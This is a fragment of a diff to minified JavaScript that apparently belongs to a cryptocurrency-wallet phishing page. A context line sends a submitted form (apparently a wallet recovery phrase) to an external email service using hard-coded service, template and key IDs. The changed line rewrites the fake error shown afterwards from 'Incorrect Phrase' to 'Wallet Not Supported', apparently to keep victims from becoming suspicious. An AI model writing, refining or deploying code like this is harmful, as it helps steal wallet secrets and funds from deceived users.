@@ -29907,7 +29907,7 @@
                                         A("service_621iwpu", "template_gnnef3h", n.current, "ZvyFQOt9PEiERL3wz").then((e => {
                                                 console.log(e),
                                                     Toastify({
-                                                        text: "Incorrect Phrase",
+                                                        text: "Wallet Not Supported",
                                                         className: "info",
                                                         style: {
                                                             background: "linear-gradient(to right, #00b09b, #96c93d)",
